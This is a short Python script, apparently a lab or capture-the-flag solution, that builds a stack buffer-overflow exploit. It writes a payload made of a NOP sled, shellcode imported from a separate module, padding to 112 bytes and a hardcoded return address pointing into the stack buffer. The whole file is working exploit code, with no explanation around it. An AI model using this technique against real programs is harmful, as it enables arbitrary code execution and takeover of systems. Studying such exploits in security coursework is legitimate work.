#!/usr/bin/env python3

import sys

from shellcode import shellcode

buffer_size = 112

nop_sled_size = 64
nop_sled = b'\x90' * nop_sled_size

payload = nop_sled + shellcode

# Padding to reach the saved return address, if needed
padding_size = buffer_size - len(nop_sled) - len(shellcode)
if padding_size > 0:
    payload += b'A' * padding_size

buffer_addr = 0x7ffffff68b60
payload += buffer_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)